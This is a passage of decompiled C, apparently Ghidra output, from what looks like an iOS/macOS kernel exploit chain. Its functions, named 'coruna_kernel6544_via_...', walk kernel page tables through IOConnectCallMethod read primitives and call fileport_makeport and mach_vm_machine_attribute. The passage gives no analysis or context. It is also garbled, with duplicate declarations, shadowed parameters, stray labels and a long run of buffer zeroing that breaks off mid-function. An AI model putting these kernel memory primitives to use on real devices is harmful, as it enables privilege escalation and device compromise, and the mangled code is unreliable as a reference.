    if (err != 0x1809 && err != 0x1c1b) {
      return 0x28007;
    }
  }
  else if (1 < err - 0x1f53U && err != 0x2258) {
    return 0x28007;
  }
  err = _fileport_makeport(val,&bootargs);
  if (err == 0) {
    handle = coruna_kernel6544_via_return_zero_2b000(handle,bootargs);
    if (handle == 0) {
      u = 0x2800e;
    }
    else {
      err = coruna_kernel6544_via_fcntl_1bf84(handle,handle + 0x14,&scratch);
      if (err == 0) {
        u = 0x2800f;
      }
      else if (scratch - 1U < 10) {
        err = coruna_mach_vm_machine_attribute(handle,handle + 0x14,0xffff);
        u = 0x28010;
        if (err != 0) {
          u = 0;
        }
      }
      else {
        u = 0x28011;
      }
    }
  }
  else {
    u = 0x2800d;
  }
  return u;
}





void coruna_mach_absolute_time(long handle)
{
  uint64_t *ptr;
  unsigned long u;
  uint64_t size;
  long handle;
  
  handle = *(long *)(handle + 0x868);
  size = _mach_absolute_time();
  if (handle != 0) {
    u = 0;
    if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
      u = ((size - *(long *)(handle + 0x868)) * (unsigned long)*(uint *)(handle + 0x25c)) /
              (unsigned long)*(uint *)(handle + 0x260);
    }
    if (u < 0x12a153440) {
      return;
    }
    handle = 0;
    do {
      ptr = (uint64_t *)(handle + 0x5e8 + handle);
      ptr[4] = 0;
      ptr[1] = 0;
      *ptr = 0;
      ptr[3] = 0;
      ptr[2] = 0;
      handle = handle + 0x28;
    } while (handle != 0x280);
    size = _mach_absolute_time();
  }
  *(uint64_t *)(handle + 0x868) = size;
  return;
}





void coruna_kernel6544_via_return_zero_2d034(uint64_t val)
{
  void (*ptr)(void);
  long handle;
  unsigned long unaff_x30;
  
  handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000();
  if (handle == 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_return_zero_2d034(val,handle);
  return;
}





uint64_t coruna_kernel6544_via_return_zero_30860(long handle,unsigned long arg,long *addr_2,uint64_t val)
{
  int err;
  uint64_t u;
  long handle;
  uint32_t size;
  uint8_t version;
  uint port;
  unsigned long tag;
  long addr;
  uint64_t kind;
  long off;
  long base;
  uint64_t scratch;
  unsigned long bootargs;
  
  u = 0;
  if (addr_2 != (long *)0x0) {
    addr = 0;
    addr_2[4] = 0;
    addr_2[1] = 0;
    *addr_2 = 0;
    addr_2[3] = 0;
    addr_2[2] = 0;
    do {
      handle = *(long *)(handle + addr + 0x5e8);
      if (handle == 0) break;
      tag = *(unsigned long *)(handle + addr + 0x5f0);
      if ((tag <= arg) && (arg < tag + *(uint *)(handle + addr + 0x5f8))) {
        err = coruna_kernel6544_via_ioconnectcallmethod_3(handle,handle,8,handle + addr + 0x608,val);
        if (err != 0) {
          handle = handle + addr;
          handle = *(long *)(handle + 0x5f0);
          addr = *(long *)(handle + 0x5e8);
          base = *(long *)(handle + 0x600);
          off = *(long *)(handle + 0x5f8);
          addr_2[4] = *(long *)(handle + 0x608);
          addr_2[1] = handle;
          *addr_2 = addr;
          addr_2[3] = base;
          addr_2[2] = off;
          return 1;
        }
        break;
      }
      addr = addr + 0x28;
    } while (addr != 0x280);
    if (*(long *)(handle + 0x5d0) == 0) {
      addr = coruna_kernel6544_via_return_zero_20958(handle);
      if (((addr == 0) || (err = coruna_kernel6544_trampoline_0001a670(handle,addr,&bootargs), err == 0)) ||
         (err = coruna_kernel6544_trampoline_0001a670(handle,addr + *(int *)(handle + 0x168),&scratch),
         err == 0)) return 0;
      size = 0x200;
      if (*(int *)(handle + 0x180) != 0x1000) {
        size = 0x800;
      }
      *(unsigned long *)(handle + 0x5d0) = bootargs;
      *(uint64_t *)(handle + 0x5d8) = scratch;
      *(uint32_t *)(handle + 0x5e0) = size;
      coruna_return_zero_23190(handle);
    }
    if ((*(int *)(handle + 0x180) == 0x1000) || (err = coruna_ctx_test_flag(handle,0x8000), err != 0))
    {
      handle = *(long *)(handle + 0x5d0);
      kind = *(uint64_t *)(handle + 0x5d8);
      addr = coruna_return_zero_30860(handle,handle,kind,kind);
      tag = arg >> 0x1b & 0x7f8;
      u = coruna_kernel6544_via_ioconnectcallmethod_3(handle,handle + tag,8,&bootargs,val);
      if ((int)u != 0) {
        if ((bootargs & 3) == 0) return 0;
        if ((bootargs & 3) == 1) {
          addr = addr + tag;
          size = 0x40000000;
          tag = 0xffffffffc0000000;
          version = 1;
        }
        else {
          if ((bootargs >> 0x3b & 1) != 0) {
            *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
          }
          addr = coruna_return_zero_30860(handle,handle,kind,bootargs & 0xfffffffff000);
          addr = addr + (arg >> 0x12 & 0xff8);
          u = coruna_kernel6544_via_ioconnectcallmethod_3(handle,addr,8,&bootargs,val);
          if ((int)u == 0) return 0;
          if ((bootargs & 3) == 0) return 0;
          if ((bootargs & 3) == 1) {
            size = 0x200000;
            tag = 0xffffffffffe00000;
            version = 1;
          }
          else {
            if ((bootargs >> 0x3b & 1) != 0) {
              *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
            }
            addr = coruna_return_zero_30860(handle,handle,kind,bootargs & 0xfffffffff000);
            addr = addr + (arg >> 9 & 0xff8);
            u = coruna_kernel6544_via_ioconnectcallmethod_3(handle,addr,8,&bootargs,val);
            if ((int)u == 0) return 0;
            if ((~(uint)bootargs & 3) != 0) return 0;
            version = 3;
            size = 0x1000;
            tag = 0xfffffffffffff000;
          }
        }
        *addr_2 = addr;
        addr_2[1] = tag & arg;
        *(uint32_t *)(addr_2 + 2) = size;
        *(uint8_t *)((long)addr_2 + 0x14) = version;
        addr_2[4] = bootargs;
        port = 3;
        if ((bootargs & 0x80) != 0) {
          port = 1;
        }
        *(uint *)(addr_2 + 3) = ((uint)(bootargs >> 0x33) & 4 | port) ^ 4;
        u = 1;
      }
    }
    else {
      if (*(int *)(handle + 0x180) != 0x4000) return 0;
      addr = *(long *)(handle + 0x5d0);
      kind = *(uint64_t *)(handle + 0x5d8);
      err = coruna_ctx_test_flag(handle,0x5000008);
      tag = 7;
      if (err != 0) {
        tag = 0x7ff;
      }
      u = coruna_kernel6544_via_ioconnectcallmethod_3(handle,addr + (tag & arg >> 0x24) * 8,8,&bootargs,val);
      if ((int)u != 0) {
        if ((~(uint)bootargs & 3) == 0) {
          if ((bootargs >> 0x3b & 1) != 0) {
            *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
          }
          handle = coruna_return_zero_30860(handle,addr,kind,bootargs & 0xffffffffc000);
          handle = handle + (arg >> 0x16 & 0x3ff8);
          u = coruna_kernel6544_via_ioconnectcallmethod_3(handle,handle,8,&bootargs,val);
          if ((int)u == 0) return 0;
          if ((bootargs & 3) != 0) {
            if ((bootargs & 3) == 1) {
              size = 0x2000000;
              tag = 0xfffffffffe000000;
              version = 1;
            }
            else {
              if ((bootargs >> 0x3b & 1) != 0) {
                *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
              }
              handle = coruna_return_zero_30860(handle,addr,kind,bootargs & 0xffffffffc000);
              handle = handle + (arg >> 0xb & 0x3ff8);
              u = coruna_kernel6544_via_ioconnectcallmethod_3(handle,handle,8,&bootargs,val);
              if ((int)u == 0) return 0;
              if ((~(uint)bootargs & 3) != 0) return 0;
              version = 3;
              size = 0x4000;
              tag = 0xffffffffffffc000;
            }
            *addr_2 = handle;
        *addr_2 = addr;
        addr_2[1] = tag & arg;
        *(uint32_t *)(addr_2 + 2) = size;
        *(uint8_t *)((long)addr_2 + 0x14) = version;
        addr_2[4] = bootargs;
        port = 3;
        if ((bootargs & 0x80) != 0) {
          port = 1;
        }
        *(uint *)(addr_2 + 3) = ((uint)(bootargs >> 0x33) & 4 | port) ^ 4;
        u = 1;
          }
        }
      }
    }
cleanup:
    if ((int)u != 0) {
      addr = 0;
      do {
        if (*(long *)(handle + 0x5e8 + addr) == 0) {
          handle = handle + addr;
          handle = addr_2[1];
          addr = *addr_2;
          base = addr_2[3];
          off = addr_2[2];
          *(long *)(handle + 0x608) = addr_2[4];
          *(long *)(handle + 0x5f0) = handle;
          *(long *)(handle + 0x5e8) = addr;
          *(long *)(handle + 0x600) = base;
          *(long *)(handle + 0x5f8) = off;
          return u;
        }
        addr = addr + 0x28;
      } while (addr != 0x280);
    }
  }
  return u;
}





void coruna_nop_stub_3(void)
{
  coruna_kernel6544_via_return_zero_30860();
  return;
}





unsigned long coruna_kernel6544_via_kernel6544_via_return_zero_30860(long arg,unsigned long val)

{
  int count;
  unsigned long type_id_14;
  uint64_t cache_41;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  unsigned long cache_42;
  
  cache_42 = 0;
  thread_attr = 0;
  cache_41 = 0;
  serial_buf = 0;
  host_info = 0;
  count = coruna_kernel6544_via_return_zero_30860(arg,val,&cache_41,1);
  if (count == 0) {
    type_id_14 = 0;
  }
  else {
    type_id_14 = *(unsigned long *)(arg + 0x188) & val | cache_42 & 0xffffffffc000;
  }
  return type_id_14;
}





unsigned long coruna_kernel6544_via_kernel6544_via_return_zero_30860_2(long arg,unsigned long val,uint64_t n)

{
  int count;
  unsigned long type_id_14;
  uint64_t cache_41;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  unsigned long cache_42;
  
  cache_42 = 0;
  thread_attr = 0;
  cache_41 = 0;
  serial_buf = 0;
  host_info = 0;
  count = coruna_kernel6544_via_return_zero_30860(arg,val,&cache_41,n);
  if (count == 0) {
    type_id_14 = 0;
  }
  else {
    type_id_14 = *(unsigned long *)(arg + 0x188) & val | cache_42 & 0xffffffffc000;
  }
  return type_id_14;
}





uint64_t coruna_slab_lookup_fast(uint64_t val,uint64_t *id_2)
{
  if (id_2 != (uint64_t *)0x0) {
    if ((void *)id_2[3] != (void *)0x0) {
      _free((void *)id_2[3]);
    }
    id_2[1] = 0;
    *id_2 = 0;
    id_2[3] = 0;
    id_2[2] = 0;
    _free(id_2);
    return 0;
  }
  return 0xad001;
}
int coruna_kernel6544_via_nop_stub_6_3(long handle,uint64_t *val)
{
  uint *ptr;
  void **lppv2;
  char *ptr;
  uint u;
  uint size;
  uint version;
  void *ptr;
  int err;
  int status;
  uint64_t *buf;
  void *buf;
  void *str;
  long handle;
  uint64_t port;
  void *copy;
  uint tag;
  unsigned long kind;
  void *data;
  unsigned long type_id;
  uint64_t type_id_8;
  uint64_t type_id_9;
  void *scratch;
  int bootargs;
  uint32_t scratch;
  long thread_attr;
  void *host_info;
  long serial_buf;
  long action;
  long block_ctx;
  long stack_guard;
  uint32_t sa_saved;
  uint32_t bootargs;
  uint32_t sa_new;
  uint32_t thread_attr;
  uint32_t host_info;
  uint serial_buf;
  void *path_buf;
  long tmp_buf;
  long region;
  uint32_t action;
  uint32_t block_ctx;
  uint32_t plist;
  uint32_t stack_guard;
  uint32_t sa_saved;
  uint url_buf;
  long json_buf;
  
  json_buf = *(long *)k_kernel_stack_chk_guard_slot;
  status = 0xad009;
  buf = _calloc(0x20,1);
  if (*(long *)k_kernel_stack_chk_guard_slot == json_buf) {
  return status;
  }
  ___stack_chk_fail();
}





bool coruna_modinfo_string_match(uint64_t val,long handle,void *ctx,uint size)
{
  int err;
  bool err;
  int status;
  unsigned long u;
  long handle;
  unsigned long size;
  
  if ((((handle == 0) || (handle = *(long *)(handle + 0x18), handle == 0)) ||
      (u = (unsigned long)*(uint *)(handle + 0x10), *(uint *)(handle + 0x10) == 0)) ||
     (*(uint *)(handle + 8) != size)) {
    err = false;
  }
  else {
    size = 0;
    err = *(int *)(handle + 0xc);
    do {
      u = u - 1;
      status = _memcmp((void *)(handle + size),ctx,(unsigned long)size);
      err = status == 0;
      size = (unsigned long)((int)size + err + size);
    } while (status != 0 && u != 0);
  }
  return err;
}





uint64_t coruna_qsort(uint64_t val,long handle,void *ctx,unsigned long arg)
{
  int err;
  int status;
  uint u;
  unsigned long size;
  int *err;
  uint64_t version;
  void *ptr;
  long handle;
  
  version = 0xad001;
  if (((handle != 0) && (handle = *(long *)(handle + 0x18), handle != 0)) &&
     (*(int *)(handle + 8) == (int)arg)) {
    size = coruna_modinfo_string_match(val,handle,ctx,arg);
    if ((size & 1) == 0) {
      if (0x3ff < *(uint *)(handle + 0x10)) {
        return 0xad00c;
      }
      ptr = (void *)(handle + (unsigned long)((*(int *)(handle + 0xc) + (int)arg) *
                                       *(uint *)(handle + 0x10)));
      _memcpy(ptr,ctx,arg & 0xffffffff);
      *(int *)(handle + 0x10) = *(int *)(handle + 0x10) + 1;
      if (*(int *)(handle + 0xc) == 2) {
        *(uint8_t *)((long)ptr + (unsigned long)*(uint *)(handle + 8)) = 2;
        *(uint8_t *)((long)ptr + (unsigned long)(*(int *)(handle + 8) + 1)) = 0;
      }
      ptr = *(void **)(handle + 0x18);
      if (ptr == (void *)0x0) {
        return 0xad001;
      }
      u = *(uint *)(handle + 0x10);
      if (u == 0) {
        return 0;
      }
      err = *(int *)(handle + 8);
      status = *(int *)(handle + 0xc);
      err = (int *)coruna_fn_ptr_cast(coruna_return_zero_18ea0);
      _qsort(ptr,(unsigned long)u,(unsigned long)(uint)(status + err),err);
    }
    version = 0;
  }
  return version;
}





uint32_t coruna_kernel6544_via_nop_stub_7_3(long handle,long *addr_2)
{
  long handle;
  int err;
  uint32_t u;
  unsigned long size;
  
  u = 0xad001;
  if (((addr_2 != (long *)0x0) && (addr_2[3] != 0)) && (*addr_2 != 0)) {
    size = *(unsigned long *)(handle + 0x158) >> 0x2b;
    handle = 0x40;
    if (size < 1099) {
      handle = 0x30;
    }
    err = coruna_nop_stub_7(handle,handle + *addr_2,addr_2[3],
                         (*(int *)((long)addr_2 + 0xc) + (int)addr_2[1]) * (int)addr_2[2]);
    u = 0x28010;
    if (err != 0) {
      handle = 0x3c;
      if (size < 1099) {
        handle = 0x2c;
      }
      err = coruna_mach_vm_machine_attribute(handle,*addr_2 + handle,(int)addr_2[2]);
      u = 0x28010;
      if (err != 0) {
        u = 0;
      }
    }
  }
  return u;
}





bool coruna_kernel6544_via_kernel6544_via_nop_stub_7_3(uint64_t val,uint size,int flags,long handle)
{
  uint64_t u;
  uint64_t size;
  int err;
  unsigned long version;
  uint64_t scratch;
  
  scratch = 0;
  if (flags == 0x14) {
    size = coruna_kernel6544_via_nop_stub_6_3(val,&scratch);
    u = scratch;
    err = (int)size;
    if (err == 0) {
      if (size != 0) {
        version = 0;
        do {
          size = coruna_qsort(size,u,handle + (version & 0xfffffffc),0x14);
          if ((int)size != 0) goto fail;
          version = version + 0x14;
        } while ((unsigned long)size * 0x14 - version != 0);
      }
      size = coruna_kernel6544_via_nop_stub_7_3(val,u);
fail:
      err = (int)size;
      coruna_slab_lookup_fast(size,u);
    }
  }
  else {
    err = 0xad001;
  }
  return err == 0;
}





void coruna_kernel6544_via_kernel6544_via_kernel6544_via_nop_stub_7_3(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_kernel6544_via_kernel6544_via_nop_stub_7_3(val,1,size_3,id_2);
  return;
}





uint64_t coruna_return_zero_18ea0(long handle,long addr_2)
{
  long handle;
  
  handle = 0;
  while( true ) {
    if (*(byte *)(handle + handle) < *(byte *)(addr_2 + handle)) {
      return 0xffffffff;
    }
    if (*(byte *)(addr_2 + handle) < *(byte *)(handle + handle)) break;
    handle = handle + 1;
    if (handle == 0x14) {
      return 0;
    }
  }
  return 1;
}





void coruna_nop_stub_4(long handle)
{
  coruna_ret_stub_3(*(uint64_t *)(handle + 0x20));
  return;
}





void coruna_nop_stub_5(long handle)
{
  coruna_kernel6544_via_return_zero_2b000(*(uint64_t *)(handle + 0x20));
  return;
}





uint64_t coruna_read_boot_manifest_hash(uint64_t *val,uint size)
{
  byte err;
  uint u;
  uint64_t size;
  long handle;
  long addr;
  long off;
  long base;
  unsigned long version;
  byte *ptr;
  char *ptr;
  uint64_t port;
  char scratch [776];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0x2e8] = '\0';
  scratch[0x2e9] = '\0';
  scratch[0x2ea] = '\0';
  scratch[0x2eb] = '\0';
  scratch[0x2ec] = '\0';
  scratch[0x2ed] = '\0';
  scratch[0x2ee] = '\0';
  scratch[0x2ef] = '\0';
  scratch[0x2e0] = '\0';
  scratch[0x2e1] = '\0';
  scratch[0x2e2] = '\0';
  scratch[0x2e3] = '\0';
  scratch[0x2e4] = '\0';
  scratch[0x2e5] = '\0';
  scratch[0x2e6] = '\0';
  scratch[0x2e7] = '\0';
  scratch[0x2f8] = '\0';
  scratch[0x2f9] = '\0';
  scratch[0x2fa] = '\0';
  scratch[0x2fb] = '\0';
  scratch[0x2fc] = '\0';
  scratch[0x2fd] = '\0';
  scratch[0x2fe] = '\0';
  scratch[0x2ff] = '\0';
  scratch[0x2f0] = '\0';
  scratch[0x2f1] = '\0';
  scratch[0x2f2] = '\0';
  scratch[0x2f3] = '\0';
  scratch[0x2f4] = '\0';
  scratch[0x2f5] = '\0';
  scratch[0x2f6] = '\0';
  scratch[0x2f7] = '\0';
  scratch[0x2c8] = '\0';
  scratch[0x2c9] = '\0';
  scratch[0x2ca] = '\0';
  scratch[0x2cb] = '\0';
  scratch[0x2cc] = '\0';
  scratch[0x2cd] = '\0';
  scratch[0x2ce] = '\0';
  scratch[0x2cf] = '\0';
  scratch[0x2c0] = '\0';
  scratch[0x2c1] = '\0';
  scratch[0x2c2] = '\0';
  scratch[0x2c3] = '\0';
  scratch[0x2c4] = '\0';
  scratch[0x2c5] = '\0';
  scratch[0x2c6] = '\0';
  scratch[0x2c7] = '\0';
  scratch[0x2d8] = '\0';
  scratch[0x2d9] = '\0';
  scratch[0x2da] = '\0';
  scratch[0x2db] = '\0';
  scratch[0x2dc] = '\0';
  scratch[0x2dd] = '\0';
  scratch[0x2de] = '\0';
  scratch[0x2df] = '\0';
  scratch[0x2d0] = '\0';
  scratch[0x2d1] = '\0';
  scratch[0x2d2] = '\0';
  scratch[0x2d3] = '\0';
  scratch[0x2d4] = '\0';
  scratch[0x2d5] = '\0';
  scratch[0x2d6] = '\0';
  scratch[0x2d7] = '\0';
  scratch[0x2a8] = '\0';
  scratch[0x2a9] = '\0';
  scratch[0x2aa] = '\0';
  scratch[0x2ab] = '\0';
  scratch[0x2ac] = '\0';
  scratch[0x2ad] = '\0';
  scratch[0x2ae] = '\0';
  scratch[0x2af] = '\0';
  scratch[0x2a0] = '\0';
  scratch[0x2a1] = '\0';
  scratch[0x2a2] = '\0';
  scratch[0x2a3] = '\0';
  scratch[0x2a4] = '\0';
  scratch[0x2a5] = '\0';
  scratch[0x2a6] = '\0';
  scratch[0x2a7] = '\0';
  scratch[0x2b8] = '\0';
  scratch[0x2b9] = '\0';
  scratch[0x2ba] = '\0';
  scratch[699] = '\0';
  scratch[700] = '\0';
  scratch[0x2bd] = '\0';
  scratch[0x2be] = '\0';
  scratch[0x2bf] = '\0';
  scratch[0x2b0] = '\0';
  scratch[0x2b1] = '\0';
  scratch[0x2b2] = '\0';
  scratch[0x2b3] = '\0';
  scratch[0x2b4] = '\0';
  scratch[0x2b5] = '\0';
  scratch[0x2b6] = '\0';
  scratch[0x2b7] = '\0';
  scratch[0x288] = '\0';
  scratch[0x289] = '\0';
  scratch[0x28a] = '\0';
  scratch[0x28b] = '\0';
  scratch[0x28c] = '\0';
  scratch[0x28d] = '\0';
  scratch[0x28e] = '\0';
  scratch[0x28f] = '\0';
  scratch[0x280] = '\0';
  scratch[0x281] = '\0';
  scratch[0x282] = '\0';
  scratch[0x283] = '\0';
  scratch[0x284] = '\0';
  scratch[0x285] = '\0';
  scratch[0x286] = '\0';
  scratch[0x287] = '\0';
  scratch[0x298] = '\0';
  scratch[0x299] = '\0';
  scratch[0x29a] = '\0';
  scratch[0x29b] = '\0';
  scratch[0x29c] = '\0';
  scratch[0x29d] = '\0';
  scratch[0x29e] = '\0';
  scratch[0x29f] = '\0';
  scratch[0x290] = '\0';
  scratch[0x291] = '\0';
  scratch[0x292] = '\0';
  scratch[0x293] = '\0';
  scratch[0x294] = '\0';
  scratch[0x295] = '\0';
  scratch[0x296] = '\0';
  scratch[0x297] = '\0';
  scratch[0x268] = '\0';
  scratch[0x269] = '\0';
  scratch[0x26a] = '\0';
  scratch[0x26b] = '\0';
  scratch[0x26c] = '\0';
  scratch[0x26d] = '\0';
  scratch[0x26e] = '\0';
  scratch[0x26f] = '\0';
  scratch[0x260] = '\0';
  scratch[0x261] = '\0';
  scratch[0x262] = '\0';
  scratch[0x263] = '\0';
  scratch[0x264] = '\0';
  scratch[0x265] = '\0';
  scratch[0x266] = '\0';
  scratch[0x267] = '\0';
  scratch[0x278] = '\0';
  scratch[0x279] = '\0';
  scratch[0x27a] = '\0';
  scratch[0x27b] = '\0';
  scratch[0x27c] = '\0';
  scratch[0x27d] = '\0';
  scratch[0x27e] = '\0';
  scratch[0x27f] = '\0';
  scratch[0x270] = '\0';
  scratch[0x271] = '\0';
  scratch[0x272] = '\0';
  scratch[0x273] = '\0';
  scratch[0x274] = '\0';
  scratch[0x275] = '\0';
  scratch[0x276] = '\0';
  scratch[0x277] = '\0';
  scratch[0x248] = '\0';
  scratch[0x249] = '\0';
  scratch[0x24a] = '\0';
  scratch[0x24b] = '\0';
  scratch[0x24c] = '\0';
  scratch[0x24d] = '\0';
  scratch[0x24e] = '\0';
  scratch[0x24f] = '\0';
  scratch[0x240] = '\0';
  scratch[0x241] = '\0';
  scratch[0x242] = '\0';
  scratch[0x243] = '\0';
  scratch[0x244] = '\0';
  scratch[0x245] = '\0';
  scratch[0x246] = '\0';
  scratch[0x247] = '\0';
  scratch[600] = '\0';
  scratch[0x259] = '\0';
  scratch[0x25a] = '\0';
  scratch[0x25b] = '\0';
  scratch[0x25c] = '\0';
  scratch[0x25d] = '\0';
  scratch[0x25e] = '\0';
  scratch[0x25f] = '\0';
  scratch[0x250] = '\0';
  scratch[0x251] = '\0';
  scratch[0x252] = '\0';
  scratch[0x253] = '\0';
  scratch[0x254] = '\0';
  scratch[0x255] = '\0';
  scratch[0x256] = '\0';
  scratch[599] = '\0';
  scratch[0x228] = '\0';
  scratch[0x229] = '\0';
  scratch[0x22a] = '\0';
  scratch[0x22b] = '\0';
  scratch[0x22c] = '\0';
  scratch[0x22d] = '\0';
  scratch[0x22e] = '\0';
  scratch[0x22f] = '\0';
  scratch[0x220] = '\0';
  scratch[0x221] = '\0';
  scratch[0x222] = '\0';
  scratch[0x223] = '\0';
  scratch[0x224] = '\0';
  scratch[0x225] = '\0';
  scratch[0x226] = '\0';
  scratch[0x227] = '\0';
  scratch[0x238] = '\0';
  scratch[0x239] = '\0';
  scratch[0x23a] = '\0';
  scratch[0x23b] = '\0';
  scratch[0x23c] = '\0';
  scratch[0x23d] = '\0';
  scratch[0x23e] = '\0';
  scratch[0x23f] = '\0';
  scratch[0x230] = '\0';
  scratch[0x231] = '\0';
  scratch[0x232] = '\0';
  scratch[0x233] = '\0';
  scratch[0x234] = '\0';
  scratch[0x235] = '\0';
  scratch[0x236] = '\0';
  scratch[0x237] = '\0';
  scratch[0x208] = '\0';
  scratch[0x209] = '\0';
  scratch[0x20a] = '\0';
  scratch[0x20b] = '\0';
  scratch[0x20c] = '\0';
  scratch[0x20d] = '\0';
  scratch[0x20e] = '\0';
  scratch[0x20f] = '\0';
  scratch[0x200] = '\0';
  scratch[0x201] = '\0';
  scratch[0x202] = '\0';
  scratch[0x203] = '\0';
  scratch[0x204] = '\0';
  scratch[0x205] = '\0';
  scratch[0x206] = '\0';
  scratch[0x207] = '\0';
  scratch[0x218] = '\0';
  scratch[0x219] = '\0';
  scratch[0x21a] = '\0';
  scratch[0x21b] = '\0';
  scratch[0x21c] = '\0';
  scratch[0x21d] = '\0';
  scratch[0x21e] = '\0';
  scratch[0x21f] = '\0';
  scratch[0x210] = '\0';
  scratch[0x211] = '\0';
  scratch[0x212] = '\0';
  scratch[0x213] = '\0';
  scratch[0x214] = '\0';
  scratch[0x215] = '\0';
  scratch[0x216] = '\0';
  scratch[0x217] = '\0';
  scratch[0x1e8] = '\0';
  scratch[0x1e9] = '\0';
  scratch[0x1ea] = '\0';
  scratch[0x1eb] = '\0';
  scratch[0x1ec] = '\0';
  scratch[0x1ed] = '\0';
  scratch[0x1ee] = '\0';
  scratch[0x1ef] = '\0';
  scratch[0x1e0] = '\0';
  scratch[0x1e1] = '\0';
  scratch[0x1e2] = '\0';
  scratch[0x1e3] = '\0';
  scratch[0x1e4] = '\0';
  scratch[0x1e5] = '\0';
  scratch[0x1e6] = '\0';
  scratch[0x1e7] = '\0';
  scratch[0x1f8] = '\0';
  scratch[0x1f9] = '\0';
  scratch[0x1fa] = '\0';
  scratch[0x1fb] = '\0';
  scratch[0x1fc] = '\0';
  scratch[0x1fd] = '\0';
  scratch[0x1fe] = '\0';
  scratch[0x1ff] = '\0';
  scratch[0x1f0] = '\0';
  scratch[0x1f1] = '\0';
  scratch[0x1f2] = '\0';
  scratch[499] = '\0';
  scratch[500] = '\0';
  scratch[0x1f5] = '\0';
  scratch[0x1f6] = '\0';
  scratch[0x1f7] = '\0';
  scratch[0x1c8] = '\0';
  scratch[0x1c9] = '\0';
  scratch[0x1ca] = '\0';
  scratch[0x1cb] = '\0';
  scratch[0x1cc] = '\0';
  scratch[0x1cd] = '\0';
  scratch[0x1ce] = '\0';
  scratch[0x1cf] = '\0';
  scratch[0x1c0] = '\0';
  scratch[0x1c1] = '\0';
  scratch[0x1c2] = '\0';
  scratch[0x1c3] = '\0';
  scratch[0x1c4] = '\0';
  scratch[0x1c5] = '\0';
  scratch[0x1c6] = '\0';
  scratch[0x1c7] = '\0';
  scratch[0x1d8] = '\0';
  scratch[0x1d9] = '\0';
  scratch[0x1da] = '\0';
  scratch[0x1db] = '\0';
  scratch[0x1dc] = '\0';
  scratch[0x1dd] = '\0';
  scratch[0x1de] = '\0';
  scratch[0x1df] = '\0';
  scratch[0x1d0] = '\0';
  scratch[0x1d1] = '\0';
  scratch[0x1d2] = '\0';
  scratch[0x1d3] = '\0';
  scratch[0x1d4] = '\0';
  scratch[0x1d5] = '\0';
  scratch[0x1d6] = '\0';
  scratch[0x1d7] = '\0';
  scratch[0x1a8] = '\0';
  scratch[0x1a9] = '\0';
  scratch[0x1aa] = '\0';
  scratch[0x1ab] = '\0';
  scratch[0x1ac] = '\0';
  scratch[0x1ad] = '\0';
  scratch[0x1ae] = '\0';
  scratch[0x1af] = '\0';
  scratch[0x1a0] = '\0';
  scratch[0x1a1] = '\0';
  scratch[0x1a2] = '\0';
  scratch[0x1a3] = '\0';
  scratch[0x1a4] = '\0';
  scratch[0x1a5] = '\0';
  scratch[0x1a6] = '\0';
  scratch[0x1a7] = '\0';
  scratch[0x1b8] = '\0';
  scratch[0x1b9] = '\0';
  scratch[0x1ba] = '\0';
  scratch[0x1bb] = '\0';
  scratch[0x1bc] = '\0';
  scratch[0x1bd] = '\0';
  scratch[0x1be] = '\0';
  scratch[0x1bf] = '\0';
  scratch[0x1b0] = '\0';
  scratch[0x1b1] = '\0';
  scratch[0x1b2] = '\0';
  scratch[0x1b3] = '\0';
  scratch[0x1b4] = '\0';
  scratch[0x1b5] = '\0';
  scratch[0x1b6] = '\0';
  scratch[0x1b7] = '\0';
  scratch[0x188] = '\0';
  scratch[0x189] = '\0';
  scratch[0x18a] = '\0';
  scratch[0x18b] = '\0';
  scratch[0x18c] = '\0';
  scratch[0x18d] = '\0';
  scratch[0x18e] = '\0';
  scratch[399] = '\0';
  scratch[0x180] = '\0';
  scratch[0x181] = '\0';
  scratch[0x182] = '\0';
  scratch[0x183] = '\0';
  scratch[0x184] = '\0';
  scratch[0x185] = '\0';
  scratch[0x186] = '\0';
  scratch[0x187] = '\0';
  scratch[0x198] = '\0';
  scratch[0x199] = '\0';
  scratch[0x19a] = '\0';
  scratch[0x19b] = '\0';
  scratch[0x19c] = '\0';
  scratch[0x19d] = '\0';
  scratch[0x19e] = '\0';
  scratch[0x19f] = '\0';
  scratch[400] = '\0';
  scratch[0x191] = '\0';
  scratch[0x192] = '\0';
  scratch[0x193] = '\0';
  scratch[0x194] = '\0';
  scratch[0x195] = '\0';
  scratch[0x196] = '\0';
  scratch[0x197] = '\0';
  scratch[0x168] = '\0';
  scratch[0x169] = '\0';
  scratch[0x16a] = '\0';
  scratch[0x16b] = '\0';
  scratch[0x16c] = '\0';
  scratch[0x16d] = '\0';
  scratch[0x16e] = '\0';
  scratch[0x16f] = '\0';
  scratch[0x160] = '\0';
  scratch[0x161] = '\0';
  scratch[0x162] = '\0';
  scratch[0x163] = '\0';
  scratch[0x164] = '\0';
  scratch[0x165] = '\0';
  scratch[0x166] = '\0';
  scratch[0x167] = '\0';
  scratch[0x178] = '\0';
  scratch[0x179] = '\0';
  scratch[0x17a] = '\0';
  scratch[0x17b] = '\0';
  scratch[0x17c] = '\0';
  scratch[0x17d] = '\0';
  scratch[0x17e] = '\0';
  scratch[0x17f] = '\0';
  scratch[0x170] = '\0';
  scratch[0x171] = '\0';
  scratch[0x172] = '\0';
  scratch[0x173] = '\0';
  scratch[0x174] = '\0';
  scratch[0x175] = '\0';
  scratch[0x176] = '\0';
  scratch[0x177] = '\0';
  scratch[0x148] = '\0';
  scratch[0x149] = '\0';
  scratch[0x14a] = '\0';
  scratch[0x14b] = '\0';
  scratch[0x14c] = '\0';
  scratch[0x14d] = '\0';
  scratch[0x14e] = '\0';
  scratch[0x14f] = '\0';
  scratch[0x140] = '\0';
  scratch[0x141] = '\0';
  scratch[0x142] = '\0';
  scratch[0x143] = '\0';
  scratch[0x144] = '\0';
